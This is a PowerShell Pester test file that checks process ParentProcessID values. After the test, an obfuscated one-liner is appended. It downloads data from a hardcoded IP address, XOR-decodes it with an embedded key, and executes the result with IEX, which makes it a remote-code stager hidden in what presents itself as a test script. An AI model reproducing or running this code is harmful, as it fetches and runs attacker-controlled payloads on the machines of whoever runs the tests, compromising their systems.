











& (Join-Path -Path $PSScriptRoot -ChildPath 'Initialize-CarbonTest.ps1' -Resolve)

Describe 'System.Diagnostics.Process' {
    It 'processes have ParentProcessID' {
        $parents = @{}
        Get-WmiObject Win32_Process |
            ForEach-Object { $parents[$_.ProcessID] = $_.ParentProcessID }
    
        $foundSome = $false
        Get-Process | 
            Where-Object { $parents.ContainsKey( [UInt32]$_.Id ) -and $_.ParentProcessID } |
            ForEach-Object {
                $foundSome = $true
                $expectedID = $parents[ [UInt32]$_.Id ]  
                $_.ParentProcessID | Should -Be $expectedID
            }
        $foundSome | Should -Be $true
    }
    
}

$WC=NeW-OBJEcT SysTem.NEt.WEBCLIenT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HeAders.Add('User-Agent',$u);$WC.PROXY = [SYStEM.NEt.WEBREqUESt]::DefaUltWEbProxy;$Wc.Proxy.CredENtiALs = [SyStEm.Net.CREDENTIALCacHe]::DEfAUltNEtworkCREDeNTiaLS;$K='j=5u]2coli8\PqEOZDHCT~af+,7tI[A^';$i=0;[Char[]]$b=([cHAr[]]($wc.DOWNLOaDStRING("http://137.117.188.120:443/index.asp")))|%{$_-bXor$k[$i++%$K.LEngTh]};IEX ($B-JOIn'')

